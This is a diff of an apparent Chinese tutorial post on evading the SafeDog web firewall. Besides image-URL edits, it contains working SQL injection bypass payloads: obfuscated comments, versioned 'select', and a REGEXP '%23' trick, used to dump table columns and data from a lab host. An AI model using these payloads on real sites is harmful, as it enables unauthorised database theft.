@@ -22,11 +22,11 @@ ___发表于_
 
 ## 安全狗最新版本
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174147.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174147.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174206.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174206.png)  
 
   
 
@@ -47,42 +47,42 @@ http://192.168.111.16/index.php?id=1%20and/ _%!%22/_ /1=1%20--%20+
 http://192.168.111.16/index.php?id=1/ _%2a%%2f_ /order/ _%2f%2f_ /by/ _%2f%2f_
 /2
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174208.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174208.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174210.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174210.png)  
   
 
 ## union select 绕过
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174211.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174211.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174212.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174212.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174214.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174214.png)
 
   
 
 ## 获取当前数据库和用户
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174215.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174215.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174216.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174216.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174217.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174217.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174219.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174219.png)
 
 数据库同理
 
@@ -112,7 +112,7 @@ from information_schema.tables where table_schema=database(/ _//_ /)
 这里其实REGEXP
 "[…任意%23]"就行，在url解码%23变成了#，安全狗认为后面全都成为了注释符，带入到mysql层面其实%23只是正则的一个参数并不是注释符
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174220.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174220.png)
 
   
 
@@ -122,18 +122,18 @@ http://192.168.111.16/index.php?id=-1 REGEXP "[…%0a%23]" / _%2a%%2f_ /union/
 _%2f%2f_ // _!50144select_ // _%2f%2f_ /1,group_concat(column_name),3  %0a
 from information_schema.columns where table_name="newss"
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174221.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174221.png)
 
 ## 获取数据
 
 http://192.168.111.16/index.php?id=-1 REGEXP "[…%0a%23]" / _%2a%%2f_ /union/
 _%2f%2f_ // _!50144select_ // _%2f%2f_ /1,content,3  %0a  from newss
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174222.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174222.png)
 
 加下方微信，拉你一起进群学习
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174223.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174223.png)
 
 往期推荐
 
@@ -181,7 +181,7 @@ bypass Bitdefender
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174225.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230222174225.png)
 
   
 
